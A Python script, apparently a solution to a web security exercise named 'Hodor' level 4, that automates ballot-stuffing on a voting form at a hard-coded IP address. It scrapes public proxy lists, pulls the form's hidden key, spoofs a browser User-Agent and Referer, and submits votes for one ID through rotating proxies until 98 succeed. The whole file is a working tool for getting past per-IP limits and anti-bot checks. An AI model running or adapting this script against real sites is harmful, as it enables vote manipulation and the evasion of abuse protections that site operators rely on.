#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from lxml.html import fromstring
from Proxy_List_Scrapper import Scrapper
from random import choice

url_hodor = "http://158.69.76.135/level4.php"


def get_proxies():
    scrapper = Scrapper(category="ALL", print_err_trace=False)
    data = scrapper.getProxies()
    return [f'{item.ip}:{item.port}' for item in data.proxies]


def current_session():
    global proxies
    proxy = proxies.pop()
    print(f"Proxy: {proxy}")
    try:
        session = requests.Session()
        current = session.get(url_hodor)
        soup = BeautifulSoup(current.text, "html.parser")
        result = soup.find_all('input', {'type': 'hidden'})
        session_proxies = {
            'http': 'http://' + proxy,
            'https': 'https://' + proxy,
        }
        data = {
            "session": {
                "id": "4386",
                "holdthedoor": "Submit",
                "key": result[0].get("value"),
            },
            "headers": {
                "referer": url_hodor,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        }
        res = session.post(
            url=url_hodor,
            data=data["session"],
            headers=data["headers"],
            proxies=session_proxies,
            timeout=5,
        )
        if len(res.text) > 100:
            print("Voted!")
            voted = True
        else:
            print(res.text)
            print("Timed out")
            voted = False
    except Exception:
        print("Connection error, skipping.")
        voted = False
    return voted


proxies = get_proxies()
success = 0
total = 0
while success < 98 and len(proxies) > 0:
    voted = current_session()
    if not voted:
        print("Failed")
    else:
        success += 1
        print(f"Vote count: {success}")
    total += 1
    print(f"Summary: {success}/{total}")
